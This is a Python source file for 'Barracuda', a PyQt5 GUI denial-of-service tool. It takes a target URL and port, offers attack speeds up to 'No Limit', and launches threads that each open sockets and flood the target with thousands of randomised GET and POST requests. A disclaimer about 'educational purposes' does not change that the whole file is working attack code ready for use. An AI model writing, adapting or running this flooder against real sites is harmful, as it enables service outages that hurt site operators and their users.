import os
os.system("pip install PyQt5")
try:
    import sys
    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QLineEdit, QComboBox, QPushButton, QVBoxLayout, QGridLayout, QWidget
    from PyQt5.QtGui import QIcon, QPixmap
    from PyQt5.QtCore import Qt, QTimer
    from colorama import Fore, init
    import socket
    import threading
    import string
    import random
    import platform
    import time
    import os
    import requests
    import queue
except ModuleNotFoundError as e:
    print(f"{e} start setup.py")
    time.sleep(5)
    exit()

init()

def cls():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

cls()

ascii_art = """
                                                                                          
                            _                                                 _        
                            ( )                                               ( )       
                            | |_      _ _  _ __  _ __   _ _    ___  _   _    _| |   _ _ 
                            | '_`\  /'_` )( '__)( '__)/'_` ) /'___)( ) ( ) /'_` | /'_` )
                            | |_) )( (_| || |   | |  ( (_| |( (___ | (_) |( (_| |( (_| |
                            (_,__/'`\__,_)(_)   (_)  `\__,_)`\____)`\___/'`\__,_)`\__,_)
                                                                                        
                                                           
                                                                            
~ Tool created by barra-dev.
~ This tool was created for educational purposes. I am not responsible for your use of this tool.  

-----------------------------------------------------------------------------------------------------

"""

color_range = [Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.WHITE, Fore.LIGHTBLACK_EX]
gradient_art = ""

for line in ascii_art.splitlines():
    for i, char in enumerate(line):
        color = color_range[i % len(color_range)]
        gradient_art += f"{color}{char}"
    gradient_art += "\n"

print(gradient_art)

class DDosGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        self.status_code = False
        self.id_loader = 0

        self.initUI()

    def initUI(self):
        self.setWindowTitle('Barracuda ~ By barra-dev')

        # Configure l'icône de la fenêtre
        self.setWindowIcon(QIcon(os.path.join(os.path.dirname(os.path.abspath(__file__)), "img", "logo.ico")))

        # Configure l'interface
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QGridLayout()
        central_widget.setLayout(layout)

        self.target_label = QLabel('Target URL:', self)
        layout.addWidget(self.target_label, 0, 0)

        self.target_entry = QLineEdit(self)
        layout.addWidget(self.target_entry, 0, 1)

        self.target_port_label = QLabel('Target Port:', self)
        layout.addWidget(self.target_port_label, 1, 0)

        self.target_port_entry = QLineEdit(self)
        layout.addWidget(self.target_port_entry, 1, 1)

        self.speed_label = QLabel('Attack Speed:', self)
        layout.addWidget(self.speed_label, 2, 0)

        self.speed_combobox = QComboBox(self)
        self.speed_combobox.addItems(["Slow", "Medium", "Fast", "Very-fast", "Brutally", "No Limit"])
        layout.addWidget(self.speed_combobox, 2, 1)

        self.start_button = QPushButton('Start Attack', self)
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button, 3, 0, 1, 2)

        self.stop_button = QPushButton('Stop Attack', self)
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        layout.addWidget(self.stop_button, 4, 0, 1, 2)

        self.status_label = QLabel('Status: Unknown', self)
        layout.addWidget(self.status_label, 5, 0, 1, 2)

        # Configurer l'image de fond
        background_image_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "img", "fond.jpg")
        self.background_label = QLabel(self)
        pixmap = QPixmap(background_image_path)
        self.background_label.setPixmap(pixmap)
        self.background_label.setScaledContents(True)
        layout.addWidget(self.background_label, 0, 0, 6, 2)

        self.resize(728, 410)

        # Mise à jour du statut
        self.status_queue = queue.Queue()
        self.update_status()

    def start_attack(self):
        target_url = self.target_entry.text()
        target_port = int(self.target_port_entry.text())
        speed = self.speed_combobox.currentText().lower()

        if not self.status_code:
            self.status_code = True
            threading.Thread(target=self.run_attack, args=(target_url, target_port, speed)).start()
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)

    def stop_attack(self):
        self.status_code = False
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def run_attack(self, target_url, target_port, speed):
        target_ip = self.get_target_ip(target_url)
        if target_ip:
            spam_loader = 5  
            create_thread = 5  
            booter_sent = 5000  
            while self.status_code:
                for i in range(create_thread):  
                    threading.Thread(target=self.http_attack, args=(target_ip, target_port, booter_sent, i)).start()
                    if speed != "no limit":
                        time.sleep(self.get_speed(speed))

    def get_target_ip(self, target_url):
        try:
            host = str(target_url).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
            return socket.gethostbyname(host)
        except socket.gaierror:
            return ""

    def http_attack(self, target_ip, target_port, booter_sent, thread_num):
        rps = 0
        url_path = ''
        path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
        path_get_loader = random.choice(path_get)
        if path_get_loader == "PY_FLOOD":
            url_path = self.generate_url_path_pyflooder(5)
            http_method = "GET"
        else:
            url_path = self.generate_url_path_choice(5)
            http_method = "POST"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if http_method == "GET":
                request_line = f"GET /{url_path} HTTP/1.1\r\n"
            elif http_method == "POST":
                request_line = f"POST / HTTP/1.1\r\n"
            packet_data = f"{request_line}Host: {target_ip}\r\n\r\n".encode()
            s.connect((target_ip, target_port))
            for _ in range(booter_sent):
                s.sendall(packet_data)
                rps += 2
            print(f"http brutalization of -----> {target_ip}:{target_port} using {http_method} method.")  
        except Exception as e:
            pass
        finally:
            s.close()

    def generate_url_path_pyflooder(self, num):
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, int(num)))
        return data

    def generate_url_path_choice(self, num):
        letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_{|}~'''
        data = ""
        for _ in range(int(num)):
            data += random.choice(letter)
        return data

    def get_speed(self, speed):
        speed_map = {
            'slow': 0.5,
            'medium': 0.3,
            'fast': 0.1,
            'very-fast': 0.05,
            'brutally': 0.01
        }
        return speed_map.get(speed, 0)

    def update_status(self):
        threading.Thread(target=self.check_status).start()
        QTimer.singleShot(3000, self.update_status)

    def check_status(self):
        target_url = self.target_entry.text()
        if target_url:
            try:
                response = requests.get(target_url, timeout=5)
                if response.status_code == 200:
                    status_text = "Status: Online"
                else:
                    status_text = f"Status: Error {response.status_code}"
            except requests.RequestException:
                status_text = "Status: Offline"
        else:
            status_text = "Status: Unknown"
        
        self.status_queue.put(status_text)
        QTimer.singleShot(100, self.update_status_label)

    def update_status_label(self):
        if not self.status_queue.empty():
            status_text = self.status_queue.get()
            self.status_label.setText(status_text)


def main():
    app = QApplication(sys.argv)
    mainWin = DDosGUI()
    mainWin.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
